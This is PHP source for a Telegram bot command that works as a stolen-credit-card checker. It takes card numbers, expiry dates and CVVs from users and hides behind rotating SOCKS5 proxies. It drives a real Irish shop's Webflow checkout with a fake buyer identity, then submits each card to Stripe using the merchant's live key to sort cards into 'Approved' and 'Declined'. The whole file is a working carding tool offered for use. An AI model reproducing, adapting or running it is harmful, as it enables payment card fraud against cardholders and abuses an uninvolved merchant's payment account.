<?php
list($cmd) = explode(" ", $message);
if($cmd == "/tlv" or $cmd == ".tlv" or $cmd == "!tlv"){

$NameGater ='Trvil';
$gateway = '/tlv :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!sd card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>
"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User
$rotate = rotate();
$socks5 = socks5();
//////////////////////=[Proxy Section]=///////////////// 


  
#------[CURL-2]------#
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟨</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);




$firstname = 'Michael';
$lastname = 'Tommas';
$ran = rand(100,900);
$email = $firstname.$lastname.$ran.'@gmail.com';

$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.munstertint.ie/.wf_graphql/csrf');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'accept: */*',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: no-cache',
    'origin: https://www.munstertint.ie',
    'referer: https://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);

$csrf = trim(strip_tags(getStr($result, 'set-cookie: wf-csrf=', ';')));
$csrf_sig = trim(strip_tags(getStr($result, 'set-cookie: wf-csrf.sig=', ';')));



$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.munstertint.ie/.wf_graphql/apollo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'accept: */*, application/json',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json',
    'cookie: wf-csrf='.$csrf.'; wf-csrf.sig='.$csrf_sig.'',
    'origin: https://www.munstertint.ie',
    'pragma: no-cache',
    'referer: https://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-wf-csrf: '.$csrf.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"AddToCart","variables":{"skuId":"631b3bec8fb21bab72be9529","count":1,"buyNow":false},"query":"mutation AddToCart($skuId: String\u0021, $count: Int\u0021, $buyNow: Boolean) {\\n  ecommerceAddToCart(sku: $skuId, count: $count, buyNow: $buyNow) {\\n    ok\\n    itemId\\n    itemCount\\n    itemPrice {\\n      unit\\n      decimalValue\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n"}]');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);

$order = trim(strip_tags(getStr($result, 'set-cookie: wf-order-id=', ';')));
$order_sig = trim(strip_tags(getStr($result, 'set-cookie: wf-order-id.sig=', ';')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://munstertint.ie/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'referer: hhttps://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Cookie: wf-order-id='.$order.'; wf-order-id.sig='.$order_sig.'; wf-csrf='.$csrf.';wf-csrf.sig='.$csrf.'',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);								

//-------------

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.munstertint.ie/.wf_graphql/apollo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'accept: */*, application/json',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json',
    'cookie: wf-csrf='.$csrf.'; wf-csrf.sig='.$csrf_sig.'',
    'origin: https://www.munstertint.ie',
    'pragma: no-cache',
    'referer: https://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-wf-csrf: '.$csrf.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"CheckoutUpdateOrderAddress","variables":{"type":"billing","name":"'.$firstname.' '.$lastname.'","address_line1":"203 West Washington Street","address_line2":null,"address_city":"Oswego","address_state":"Illinois","address_zip":"60543","address_country":"US"},"query":"mutation CheckoutUpdateOrderAddress($type: String!, $name: String, $address_line1: String, $address_line2: String, $address_city: String, $address_state: String, $address_country: String, $address_zip: String) {\n  ecommerceUpdateAddress(type: $type, addressee: $name, line1: $address_line1, line2: $address_line2, city: $address_city, state: $address_state, country: $address_country, postalCode: $address_zip) {\n    ok\n    __typename\n  }\n}\n"}]');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);


//-------------

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.munstertint.ie/.wf_graphql/apollo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'accept: */*, application/json',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json',
    'cookie: wf-csrf='.$csrf.'; wf-csrf.sig='.$csrf_sig.'',
    'origin: https://www.munstertint.ie',
    'pragma: no-cache',
    'referer: https://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-wf-csrf: '.$csrf.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"CheckoutUpdateOrderIdentity","variables":{"email":"'.$email.'"},"query":"mutation CheckoutUpdateOrderIdentity($email: String) {\n  ecommerceUpdateIdentity(email: $email) {\n    ok\n    __typename\n  }\n}\n"},{"operationName":"CheckoutUpdateOrderAddress","variables":{"type":"billing","name":"'.$firstname.' '.$lastname.'","address_line1":"203 West Washington Street","address_line2":null,"address_city":"Oswego","address_state":"Illinois","address_zip":"60543","address_country":"US"},"query":"mutation CheckoutUpdateOrderAddress($type: String!, $name: String, $address_line1: String, $address_line2: String, $address_city: String, $address_state: String, $address_country: String, $address_zip: String) {\n  ecommerceUpdateAddress(type: $type, addressee: $name, line1: $address_line1, line2: $address_line2, city: $address_city, state: $address_state, country: $address_country, postalCode: $address_zip) {\n    ok\n    __typename\n  }\n}\n"}]');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Nuss+Sioo&billing_details[email]=jusdasqww%40hotmail.com&billing_details[address][line1]=1895+Tennessee+73&billing_details[address][city]=Newport&billing_details[address][state]=Tennessee&billing_details[address][country]=US&billing_details[address][postal_code]=37821&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=a9de4793-2622-49ae-b907-b7c991da52552f4b5a&muid=e23eed04-c3e9-4d84-b5e9-896ec25b764a585749&sid=9792edf3-32f3-4e29-96bd-7cb63fb12c87c083cc&pasted_fields=number&payment_user_agent=stripe.js%2Fe3bcb11bc8%3B+stripe-js-v3%2Fe3bcb11bc8%3B+split-card-element&time_on_page=702906&key=pk_live_nyPnaDuxaj8zDxRbuaPHJjip&_stripe_account=acct_1JefkLABGU2X3g66&_stripe_version=2020-03-02');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);

$id = trim(getStr($result, '"id": "', '"'));


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.munstertint.ie/.wf_graphql/apollo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.munstertint.ie',
    'accept: */*, application/json',
    'accept-language: es-ES,es;q=0.9',
    'cache-control: no-cache',
    'content-type: application/json',
    'cookie: wf-csrf='.$csrf.'; wf-csrf.sig='.$csrf_sig.'',
    'origin: https://www.munstertint.ie',
    'pragma: no-cache',
    'referer: https://www.munstertint.ie/product/headlight-restoration',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-wf-csrf: '.$csrf.'',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"CheckoutUpdateStripePaymentMethod","variables":{"paymentMethod":"'.$id.'"},"query":"mutation CheckoutUpdateStripePaymentMethod($paymentMethod: String!) {\n  ecommerceStoreStripePaymentMethod(paymentMethod: $paymentMethod) {\n    ok\n    __typename\n  }\n}\n"}]');
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
$result = curl_exec($ch);
$message = trim(getStr($result, '"message":"', '"'));
$message1 = trim(getStr($result, '"stripeMessage":"', '"'));
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


$res_live = array(
"Your card's security code is invalid",
"Your card's security code is incorrect.",
"Your card's security code is invalid"
);

if(in_array($message1,$res_live)){
$status = "Approved! 🟩";
$response = "$message 🟩";
}elseif(substr_count($result, '"ok":true,')){
$status = "Approved! 🟩";
$response = "Approved!🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$message ($message1)";
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

?>